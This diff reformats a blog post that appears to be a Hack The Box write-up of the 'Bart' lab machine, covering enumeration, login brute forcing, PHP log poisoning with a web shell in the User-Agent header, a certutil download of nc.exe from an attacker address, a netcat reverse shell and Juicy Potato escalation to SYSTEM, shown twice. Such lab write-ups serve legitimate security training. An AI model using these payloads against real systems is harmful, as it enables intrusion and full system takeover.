@@ -1,1 +1,157 @@
-<html><head><meta charset="utf-8"></head><body><p>Sub domains found</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1147/554;" src="../img/posts/2024-09-25-Bart(HTB)/01-b4eaf39bd8.png" width="1147" height="554"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Possible users found</p><figure class="image"><img style="aspect-ratio:1159/451;" src="../img/posts/2024-09-25-Bart(HTB)/02-d97803ff41.png" width="1159" height="451"></figure><p>&nbsp;</p><p>Found another user in html code</p><p>Harvey Potter h.potter</p><p>&nbsp;</p><p>&lt;!-- &lt;div class="owl-item" style="width: 380px;"&gt;&lt;div class="team-item"&gt; &lt;div class="team-inner"&gt; &lt;div class="pop-overlay"&gt; &lt;div class="team-pop"&gt; &lt;div class="team-info"&gt; &lt;div class="name"&gt;Harvey Potter&lt;/div&gt; &lt;div class="pos"&gt;Developer@BART&lt;/div&gt; &lt;ul class="team-social"&gt; &lt;li&gt;&lt;a class="facebook" href="#" target="_blank"&gt;&lt;i class="fa"&gt;F&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class="twitter" href="#" target="_blank"&gt;&lt;i class="fa"&gt;T&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class="google" href="#" target="_blank"&gt;&lt;i class="fa"&gt;G&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class="mail" href="mailto:h.potter@bart.htb" target="_blank"&gt;&lt;i class="fa"&gt;M&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="avatar"&gt; &lt;img src="webste/1_002.jpg" class="attachment-sydney-medium-thumb size-sydney-medium-thumb wp-post-image" alt="" sizes="(max-width: 400px) 100vw, 400px" width="400" height="400"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="team-content"&gt; &lt;div class="name"&gt; Harvey Potter &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&lt;/div&gt; &lt;div class="pos"&gt;Developer@BART&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;--&gt; &lt;!-- Adding other employees breaks the CSS, I will fix it later. --&gt;</p><p>&nbsp;</p><p>&nbsp;</p><p>Forum Site is running WordPress 4.8.2</p><p>&nbsp;</p><p>Monitoring site running php monitor v3.2.1</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1481/502;" src="../img/posts/2024-09-25-Bart(HTB)/03-ed72a2ef5d.png" width="1481" height="502"></figure><p>&nbsp;</p><p>Using all the names found above I generated possible usernames with username anarchy and we found a valid one.&nbsp;</p><p>http://monitor.bart.htb/index.php?action=forgot</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:479/381;" src="../img/posts/2024-09-25-Bart(HTB)/04-f9c0faef29.png" width="479" height="381"></figure><p>&nbsp;</p><p>daniel and harvey are valid users</p><p>&nbsp;</p><p>I tried brute forcing with hydra and burpsuite. Hydra found nothing probably due to the csrf token. Even with the right password it failed. I had generated a wordlist with harvey potters information and burpsuite was taking forever as it was roughly 5000 words. I looked up the guide and the password is potter(which was on my list and would have eventually worked but free version of burp takes forever).</p><p>&nbsp;</p><p>Harvey:Potter</p><p>&nbsp;</p><p>Once signed in we can see another sub domain</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1557/658;" src="../img/posts/2024-09-25-Bart(HTB)/05-8877936a39.png" width="1557" height="658"></figure><p>&nbsp;</p><p>&nbsp;</p><p>With another login page</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:413/345;" src="../img/posts/2024-09-25-Bart(HTB)/06-c6a2002e80.png" width="413" height="345"></figure><p>Tried brute forcing with no luck found some directories. Register.php is super interesting.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:750/171;" src="../img/posts/2024-09-25-Bart(HTB)/07-2f173f9ec0.png" width="750" height="171"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>I tried creating a user and had done it at the wrong link. I did it at register_form.php as i found from the source code but I should have done it with register.php. Simple mistake.</p><p>&nbsp;</p><p>POST /simple_chat/register.php HTTP/1.1<br>Host: internal-01.bart.htb<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate, br<br>Content-Type: application/x-www-form-urlencoded<br>Cookie: PHPSESSID=1bpn3ts6gtr300uvqbdv3fnjug<br>Connection: keep-alive<br>Content-Length: 36</p><p>uname=testuser&amp;passwd=testpassword</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1548/695;" src="../img/posts/2024-09-25-Bart(HTB)/08-508a258069.png" width="1548" height="695"></figure><p><br>&nbsp;</p><p>&nbsp;</p><p>Interesting code in the html</p><p>&lt;script&gt; function saveChat() { // create a serialized object and send to log_chat.php. Once done hte XHR request, alert "Done" var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { &nbsp; &nbsp; if (xhr.readyState == XMLHttpRequest.DONE) { &nbsp; &nbsp; &nbsp; &nbsp; alert(xhr.responseText); &nbsp; &nbsp; } } xhr.open('GET', 'http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey', true); xhr.send(null); alert("Done"); } &lt;/script&gt;</p><p>&nbsp;</p><p>Looking at this code I instantly thought of log poisoning and that's exactly what we have here.<br><br>&nbsp;</p><figure class="image"><img style="aspect-ratio:1849/607;" src="../img/posts/2024-09-25-Bart(HTB)/09-32ccf2203f.png" width="1849" height="607"></figure><p><br>GET /log/log.php?cmd=dir&amp;filename=log.php&amp;username=harvey HTTP/1.1<br>Host: internal-01.bart.htb<br>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;<br>Accept: */*<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate, br<br>Connection: keep-alive<br>Referer: http://internal-01.bart.htb/<br>Cookie: PHPSESSID=1bpn3ts6gtr300uvqbdv3fnjug</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Shell as nt authority\iusr</u></strong></span></p><p>&nbsp;</p><p>Upload nc.exe to the machine using the RCE exploit above and certutil</p><p><code>GET /log/log.php?cmd=certutil+-urlcache+-f+http%3a//10.10.14.8/nc.exe+nc.exe&amp;filename=log.php&amp;username=harvey HTTP/1.1</code><br><code>Host: internal-01.bart.htb</code><br><code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code><br><code>Accept: */*</code><br><code>Accept-Language: en-US,en;q=0.5</code><br><code>Accept-Encoding: gzip, deflate, br</code><br><code>Connection: keep-alive</code><br><code>Referer: http://internal-01.bart.htb/</code><br><code>Cookie: PHPSESSID=1bpn3ts6gtr300uvqbdv3fnjug</code></p><p>&nbsp;</p><p>&nbsp;</p><p>Executing nc.exe for a shell</p><p><code>GET /log/log.php?cmd=.\nc.exe+-e+cmd+10.10.14.8+443&amp;filename=log.php&amp;username=harvey HTTP/1.1</code><br><code>Host: internal-01.bart.htb</code><br><code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code><br><code>Accept: */*</code><br><code>Accept-Language: en-US,en;q=0.5</code><br><code>Accept-Encoding: gzip, deflate, br</code><br><code>Connection: keep-alive</code><br><code>Referer: http://internal-01.bart.htb/</code><br><code>Cookie: PHPSESSID=1bpn3ts6gtr300uvqbdv3fnjug</code><br>&nbsp;</p><p>&nbsp;</p><p><br>&nbsp;We get a callback</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:483/236;" src="../img/posts/2024-09-25-Bart(HTB)/10-e9f9135406.png" width="483" height="236"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Shell as system</u></strong></span></p><p>We cannot get the user flag yet but we do have impersonate privilege enabled so we should be able to exploit this.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:630/224;" src="../img/posts/2024-09-25-Bart(HTB)/11-544e238059.png" width="630" height="224"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Using Juciy Potato</p><p>jp.exe -t * -p shell.bat -c {e60687f7-01a1-40aa-86ac-db1cbf673334} -l 8080</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:759/128;" src="../img/posts/2024-09-25-Bart(HTB)/12-7093e3ed78.png" width="759" height="128"></figure><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:550/182;" src="../img/posts/2024-09-25-Bart(HTB)/13-5e3c834092.png" width="550" height="182"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Bart | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2024-09-25-Bart(HTB)/01-b4eaf39bd8.png" alt="HTB: Bart cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">HTB: Bart</h1>
+                <div class="post-meta">September 25, 2024 &bull; HTB</div>
+            </div>
+        </header>
+
+        <p>Sub domains found</p>
+
+        <img alt="Screenshot 1" height="554" src="../img/posts/2024-09-25-Bart(HTB)/01-b4eaf39bd8.png" style="aspect-ratio:1147/554;" width="1147"/>
+
+        <p>Possible users found</p>
+
+        <img alt="Screenshot 2" height="451" src="../img/posts/2024-09-25-Bart(HTB)/02-d97803ff41.png" style="aspect-ratio:1159/451;" width="1159"/>
+
+        <p>Found another user in html code</p>
+
+        <p>Harvey Potter h.potter</p>
+
+        <p>&lt;!-- &lt;div class="owl-item" style="width: 380px;"&gt;&lt;div class="team-item"&gt; &lt;div class="team-inner"&gt; &lt;div class="pop-overlay"&gt; &lt;div class="team-pop"&gt; &lt;div class="team-info"&gt; &lt;div class="name"&gt;Harvey Potter&lt;/div&gt; &lt;div class="pos"&gt;Developer@BART&lt;/div&gt; &lt;ul class="team-social"&gt; &lt;li&gt;&lt;a class="facebook" href="#" target="_blank"&gt;&lt;i class="fa"&gt;F&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class="twitter" href="#" target="_blank"&gt;&lt;i class="fa"&gt;T&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class="google" href="#" target="_blank"&gt;&lt;i class="fa"&gt;G&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class="mail" href="mailto:h.potter@bart.htb" target="_blank"&gt;&lt;i class="fa"&gt;M&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="avatar"&gt; &lt;img src="webste/1_002.jpg" class="attachment-sydney-medium-thumb size-sydney-medium-thumb wp-post-image" alt="" sizes="(max-width: 400px) 100vw, 400px" width="400" height="400"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="team-content"&gt; &lt;div class="name"&gt; Harvey Potter                &lt;/div&gt; &lt;div class="pos"&gt;Developer@BART&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;--&gt; &lt;!-- Adding other employees breaks the CSS, I will fix it later. --&gt;</p>
+
+        <p>Forum Site is running WordPress 4.8.2</p>
+
+        <p>Monitoring site running php monitor v3.2.1</p>
+
+        <img alt="Screenshot 3" height="502" src="../img/posts/2024-09-25-Bart(HTB)/03-ed72a2ef5d.png" style="aspect-ratio:1481/502;" width="1481"/>
+
+        <p>Using all the names found above I generated possible usernames with username anarchy and we found a valid one. </p>
+
+        <p>http://monitor.bart.htb/index.php?action=forgot</p>
+
+        <img alt="Screenshot 4" height="381" src="../img/posts/2024-09-25-Bart(HTB)/04-f9c0faef29.png" style="aspect-ratio:479/381;" width="479"/>
+
+        <p>daniel and harvey are valid users</p>
+
+        <p>I tried brute forcing with hydra and burpsuite. Hydra found nothing probably due to the csrf token. Even with the right password it failed. I had generated a wordlist with harvey potters information and burpsuite was taking forever as it was roughly 5000 words. I looked up the guide and the password is potter(which was on my list and would have eventually worked but free version of burp takes forever).</p>
+
+        <p>Harvey:Potter</p>
+
+        <p>Once signed in we can see another sub domain</p>
+
+        <img alt="Screenshot 5" height="658" src="../img/posts/2024-09-25-Bart(HTB)/05-8877936a39.png" style="aspect-ratio:1557/658;" width="1557"/>
+
+        <p>With another login page</p>
+
+        <img alt="Screenshot 6" height="345" src="../img/posts/2024-09-25-Bart(HTB)/06-c6a2002e80.png" style="aspect-ratio:413/345;" width="413"/>
+
+        <p>Tried brute forcing with no luck found some directories. Register.php is super interesting.</p>
+
+        <img alt="Screenshot 7" height="171" src="../img/posts/2024-09-25-Bart(HTB)/07-2f173f9ec0.png" style="aspect-ratio:750/171;" width="750"/>
+
+        <p>I tried creating a user and had done it at the wrong link. I did it at register_form.php as i found from the source code but I should have done it with register.php. Simple mistake.</p>
+
+        <p>POST /simple_chat/register.php HTTP/1.1<br/>Host: internal-01.bart.htb<br/>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate, br<br/>Content-Type: application/x-www-form-urlencoded<br/>Cookie: PHPSESSID=1bpn3ts6gtr300uvqbdv3fnjug<br/>Connection: keep-alive<br/>Content-Length: 36</p>
+
+        <p>uname=testuser&amp;passwd=testpassword</p>
+
+        <img alt="Screenshot 8" height="695" src="../img/posts/2024-09-25-Bart(HTB)/08-508a258069.png" style="aspect-ratio:1548/695;" width="1548"/>
+
+        <p>Interesting code in the html</p>
+
+        <p>&lt;script&gt; function saveChat() { // create a serialized object and send to log_chat.php. Once done hte XHR request, alert "Done" var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() {     if (xhr.readyState == XMLHttpRequest.DONE) {         alert(xhr.responseText);     } } xhr.open('GET', 'http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey', true); xhr.send(null); alert("Done"); } &lt;/script&gt;</p>
+
+        <p>Looking at this code I instantly thought of log poisoning and that's exactly what we have here.<br/><br/> </p>
+
+        <img alt="Screenshot 9" height="607" src="../img/posts/2024-09-25-Bart(HTB)/09-32ccf2203f.png" style="aspect-ratio:1849/607;" width="1849"/>
+
+        <p><br/>GET /log/log.php?cmd=dir&amp;filename=log.php&amp;username=harvey HTTP/1.1<br/>Host: internal-01.bart.htb<br/>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;<br/>Accept: */*<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate, br<br/>Connection: keep-alive<br/>Referer: http://internal-01.bart.htb/<br/>Cookie: PHPSESSID=1bpn3ts6gtr300uvqbdv3fnjug</p>
+
+        <h1 style="color:red;">Shell as nt authority\iusr</h1>
+
+        <p>Upload nc.exe to the machine using the RCE exploit above and certutil</p>
+
+        <p><code>GET /log/log.php?cmd=certutil+-urlcache+-f+http%3a//10.10.14.8/nc.exe+nc.exe&amp;filename=log.php&amp;username=harvey HTTP/1.1</code><br/><code>Host: internal-01.bart.htb</code><br/><code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code><br/><code>Accept: */*</code><br/><code>Accept-Language: en-US,en;q=0.5</code><br/><code>Accept-Encoding: gzip, deflate, br</code><br/><code>Connection: keep-alive</code><br/><code>Referer: http://internal-01.bart.htb/</code><br/><code>Cookie: PHPSESSID=1bpn3ts6gtr300uvqbdv3fnjug</code></p>
+
+        <p>Executing nc.exe for a shell</p>
+
+        <p><code>GET /log/log.php?cmd=.\nc.exe+-e+cmd+10.10.14.8+443&amp;filename=log.php&amp;username=harvey HTTP/1.1</code><br/><code>Host: internal-01.bart.htb</code><br/><code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code><br/><code>Accept: */*</code><br/><code>Accept-Language: en-US,en;q=0.5</code><br/><code>Accept-Encoding: gzip, deflate, br</code><br/><code>Connection: keep-alive</code><br/><code>Referer: http://internal-01.bart.htb/</code><br/><code>Cookie: PHPSESSID=1bpn3ts6gtr300uvqbdv3fnjug</code><br/> </p>
+
+        <p><br/> We get a callback</p>
+
+        <img alt="Screenshot 10" height="236" src="../img/posts/2024-09-25-Bart(HTB)/10-e9f9135406.png" style="aspect-ratio:483/236;" width="483"/>
+
+        <h1 style="color:red;">Shell as system</h1>
+
+        <p>We cannot get the user flag yet but we do have impersonate privilege enabled so we should be able to exploit this.</p>
+
+        <img alt="Screenshot 11" height="224" src="../img/posts/2024-09-25-Bart(HTB)/11-544e238059.png" style="aspect-ratio:630/224;" width="630"/>
+
+        <p>Using Juciy Potato</p>
+
+        <p>jp.exe -t * -p shell.bat -c {e60687f7-01a1-40aa-86ac-db1cbf673334} -l 8080</p>
+
+        <img alt="Screenshot 12" height="128" src="../img/posts/2024-09-25-Bart(HTB)/12-7093e3ed78.png" style="aspect-ratio:759/128;" width="759"/>
+
+        <img alt="Screenshot 13" height="182" src="../img/posts/2024-09-25-Bart(HTB)/13-5e3c834092.png" style="aspect-ratio:550/182;" width="550"/>
+    </article>
+
+</body>
+</html>
